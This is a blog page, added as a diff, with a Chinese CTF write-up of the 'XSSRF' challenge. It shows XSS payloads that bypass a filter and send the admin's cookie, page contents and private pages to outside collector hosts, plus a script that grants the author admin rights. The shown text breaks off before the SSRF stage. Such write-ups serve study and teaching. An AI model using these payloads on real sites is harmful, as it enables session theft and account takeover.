@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-hk">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="XSS,SSRF," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="最近做了个题，XSS+SSRF，很有意思的一道题，从前端打到后台，一共有3个flag。">
+<meta name="keywords" content="XSS,SSRF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSSRF">
+<meta property="og:url" content="http://yoursite.com/2018/10/01/XSSRF/index.html">
+<meta property="og:site_name" content="C0mRaDe&#39;s Blog">
+<meta property="og:description" content="最近做了个题，XSS+SSRF，很有意思的一道题，从前端打到后台，一共有3个flag。">
+<meta property="og:locale" content="zh-hk">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538377574296.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538378461167.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538378700276.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538379205500.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538379554281.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538379769752.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538379897473.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538381089825.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538381618999.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538382193308.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538382607573.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538382785223.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538383275676.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538383374028.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538383473325.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538383592913.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538383827792.png">
+<meta property="og:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538383889838.png">
+<meta property="og:updated_time" content="2018-10-01T09:16:53.839Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSSRF">
+<meta name="twitter:description" content="最近做了个题，XSS+SSRF，很有意思的一道题，从前端打到后台，一共有3个flag。">
+<meta name="twitter:image" content="https://www.github.com/coomrade/Img/raw/master/pics/1538377574296.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/10/01/XSSRF/"/>
+
+
+
+
+
+  <title>XSSRF | C0mRaDe's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">C0mRaDe's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">大学生的酸腐和矫情是这世界上最没用的东西.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            歸檔
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/01/XSSRF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="C0mRaDe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/gabe-crow.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="C0mRaDe's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XSSRF</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">發表於</span>
+              
+              <time title="創建於" itemprop="dateCreated datePublished" datetime="2018-10-01T16:53:15+08:00">
+                2018-10-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分類於</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/信息安全/" itemprop="url" rel="index">
+                    <span itemprop="name">信息安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>最近做了个题，XSS+SSRF，很有意思的一道题，从前端打到后台，一共有3个flag。<a id="more"></a><br>题目界面如下：<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538377574296.png" alt="enter description here">摸索了一下功能，大概就是注册，登录，发邮件，查看已发邮件。题目给了提示，要<code>gain access to admin&#39;s panel</code>，再加上可以发邮件给admin，自然想到用XSS去打admin的cookie。先尝试直接<code>&lt;script&gt;</code>上，发现被过滤了<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538378461167.png" alt="enter description here">如果<code>&lt;script&gt;</code>标签被ban，可以用img或者src的属性去打cookie，比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/onerror=&quot;document.location=&apos;http://x53gm2.ceye.io/asdas&apos;+document.cookie&quot; src=#&gt;</span><br><span class="line">&lt;svg/onload=&quot;document.location=&apos;http://x53gm2.ceye.io/asdasd&apos;+document.cookie&quot;&gt;</span><br></pre></td></tr></table></figure></p>
+<p>这题用以上两个payload都能打到cookie，加斜杠是因为过滤了<code>onerror</code>和<code>onload</code>。要注意的是，img的<code>src=#</code>不能省略。<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538378700276.png" alt="enter description here">这样就拿到了flag1:<code>FLAG{Sometimes, XSS can be critical vulnerability &lt;script&gt;alert(1)&lt;/script&gt;}</code>cookie还提示了flag2在redis中。那么我们需要想办法去打redis了。首先想到的是网鼎杯第一场web1的打法，直接redis写webshell，但是失败了，一个，有可能redis不是开在6379端口，另一个，也许根本就没有写权限。那么，需要另外想办法。这时候我们发现<code>robots.txt</code>里面有一些信息<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538379205500.png" alt="enter description here">看得出来，<code>config.php</code>应该非常关键，<code>backup.zip</code>带密码，暂时先不管。这时候想到，既然要得到管理面板的访问权限，那么可以用XSS去读admin面板的内容，读文件的时候要注意，js的<code>btoa()</code>函数可以用来base64编码。构造如下payload：<code>&lt;svg/onload=&quot;document.location=&#39;http://x53gm2.ceye.io/&#39;+btoa(document.getElementsByTagName(&#39;body&#39;)[0].innerHTML);&quot;&gt;</code>发现过滤比较过分<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538379554281.png" alt="enter description here">这时候可以用unicode编码去绕过<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538379769752.png" alt="enter description here">成功打到了目标页面的内容<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538379897473.png" alt="enter description here">解码之后得到源码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">"navbar navbar-expand-lg navbar-dark bg-dark d-flex"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"index.php"</span>&gt;</span>XSSRF<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"navbar-nav"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"sendmail.php"</span>&gt;</span>Send Mail<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"mailbox.php"</span>&gt;</span>Mailbox<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"sentmail.php"</span>&gt;</span>Sent Mail<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"setadmin.php"</span>&gt;</span>Set Admin<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"request.php"</span>&gt;</span>Send Request<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"navbar-nav ml-auto"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"navbar-text"</span>&gt;</span>Hello, admin (Administrator)<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">"nav-item"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"nav-link"</span> <span class="attr">href</span>=<span class="string">"logout.php"</span>&gt;</span>Logout<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"card text-white bg-dark"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"card-body"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h2</span> <span class="attr">class</span>=<span class="string">"card-title"</span>&gt;</span></span><br><span class="line">            weqe          <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">h4</span>&gt;</span>From: <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"sendmail.php?to=comrade"</span>&gt;</span>comrade<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"card-text"</span>&gt;</span><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">"document.location='http://x53gm2.ceye.io/'+btoa(document.getElementsByTagName('body')[0].innerHTML);"</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><code>request.php</code>和<code>setadmin.php</code>我们都没有,用<code>XMLHttprequest</code>读一下，payload如下：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(xmlhttp.readyState==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)&#123;</span><br><span class="line"><span class="built_in">document</span>.location=<span class="string">'http://123.207.99.17/?'</span>+btoa(xmlhttp.responseText);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(<span class="string">'GET'</span>,<span class="string">'setadmin.php'</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure></p>
+<p>成功打到页面<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538381089825.png" alt="enter description here">这里用<code>ceye.io</code>是不行的，我也搞不懂为啥，只能用自己的VPS。<code>setadmin.php</code>:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;XSSRF - Set Admin&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"bootstrap/css/bootstrap.min.css"</span> media=<span class="string">"all"</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"style.css"</span> media=<span class="string">"all"</span>&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">&lt;nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex"&gt;</span><br><span class="line">  &lt;a class="navbar-brand" href="index.php"&gt;XSSRF&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">  &lt;ul class="navbar-nav"&gt;</span><br><span class="line">    &lt;li class="nav-item"&gt;</span><br><span class="line">      &lt;a class="nav-link" href="sendmail.php"&gt;Send Mail&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class="nav-item"&gt;</span><br><span class="line">      &lt;a class="nav-link" href="mailbox.php"&gt;Mailbox&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class="nav-item"&gt;</span><br><span class="line">      &lt;a class="nav-link" href="sentmail.php"&gt;Sent Mail&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class="nav-item"&gt;</span><br><span class="line">      &lt;a class="nav-link" href="setadmin.php"&gt;Set Admin&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class="nav-item"&gt;</span><br><span class="line">      &lt;a class="nav-link" href="request.php"&gt;Send Request&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">  &lt;ul class="navbar-nav ml-auto"&gt;</span><br><span class="line">    &lt;li class="nav-item"&gt;</span><br><span class="line">      &lt;span class="navbar-text"&gt;Hello, admin (Administrator)&lt;/span&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class="nav-item"&gt;</span><br><span class="line">      &lt;a class="nav-link" href="logout.php"&gt;Logout&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class="container"&gt;</span><br><span class="line">      &lt;form action=<span class="string">"/setadmin.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;div class="form-group"&gt;</span><br><span class="line">          &lt;label <span class="keyword">for</span>=<span class="string">"username"</span>&gt;Username&lt;/label&gt;</span><br><span class="line">          &lt;input type="text" name="username" class="form-control" id="username" aria-describedby="username" placeholder="Username"&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;button class="btn btn-primary"&gt;Give Admin Access&lt;/button&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>可以看到，有一个表单，可以传一个<code>username</code>的参数，结合文件名，这应该是拿来赋予用户admin权限的，那么我们可以POST自己的id过去看看有什么效果，构造payload如下<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=<span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="keyword">var</span> formdata=<span class="keyword">new</span> FormData();</span><br><span class="line">formdata.append(<span class="string">'username'</span>,<span class="string">'comrade'</span>);</span><br><span class="line">xmlhttp.open(<span class="string">'POST'</span>,<span class="string">'setadmin.php'</span>,<span class="literal">true</span>);</span><br><span class="line">xmlhttp.send(formdata);</span><br></pre></td></tr></table></figure></p>
+<p>发过去之后，重新登录，发现页面变成了这样子<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538381618999.png" alt="enter description here">尝试修改了<code>referer</code>和<code>X-Forwarded-For</code>，都没有用，想到刚刚的<code>config.php</code>，稍微修改下payload去打，发现没有返回东西<img src="https://www.github.com/coomrade/Img/raw/master/pics/1538382193308.png" alt="enter description here">说明<code>config.php</code>是纯PHP代码，然后同样的方法去打<code>request.php</code>，得到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;XSSRF - Request&lt;/title&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"bootstrap/css/bootstrap.min.css"</span> media=<span class="string">"all"</span>&gt;</span><br><span class="line">    &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"style.css"</span> media=<span class="string">"all"</span>&gt;</span><br><span class="line">    &lt;style&gt;pre &#123; background-color: <span class="comment">#eee; padding: 5px; &#125;&lt;/style&gt;</span></span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">&lt;nav class="navbar navbar-expand-lg navbar-dark bg-dark d-flex"&gt;</span><br><span class="line">  &lt;a class="navbar-brand" href="index.php"&gt;XSSRF&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">  &lt;ul class="navbar-nav"&gt;</span><br><span class="line">    &lt;li class="nav-item"&gt;</span><br><span class="line">      &lt;a class="nav-link" href="sendmail.php"&gt;Send Mail&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class="nav-item"&gt;</span><br><span class="line">      &lt;a class="nav-link" href="mailbox.php"&gt;Mailbox&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class="nav-item"&gt;</span><br><span class="line">      &lt;a class="nav-link" href="sentmail.php"&gt;Sent Mail&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class="nav-item"&gt;</span><br><span class="line">      &lt;a class="nav-link" href="setadmin.php"&gt;Set Admin&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class="nav-item"&gt;</span><br><span class="line">      &lt;a class="nav-link" href="request.php"&gt;Send Request&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">  &lt;ul class="navbar-nav ml-auto"&gt;</span><br><span class="line">    &lt;li class="nav-item"&gt;</span><br><span class="line">      &lt;span class="navbar-text"&gt;Hello, admin (Administrator)&lt;/span&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">    &lt;li class="nav-item"&gt;</span><br><span class="line">      &lt;a class="nav-link" href="logout.php"&gt;Logout&lt;/a&gt;</span><br><span class="line">    &lt;/li&gt;</span><br><span class="line">  &lt;/ul&gt;</span><br><span class="line">&lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">    &lt;div class="container"&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      &lt;form action=<span class="string">"/request.php"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">        &lt;div class="form-group"&gt;</span><br><span class="line">          &lt;label <span class="keyword">for</span>=<span class="string">"url"</span>&gt;URL&lt;/label&gt;</span><br><span class="line">          &lt;textarea name="url" class="form-control" id="url" aria-describedby="url" placeholder="URL" rows="10"&gt;&lt;/textarea&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;button class="btn btn-primary"&gt;Send Request&lt;/button&gt;</span><br><span class="line">      &lt;/form&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
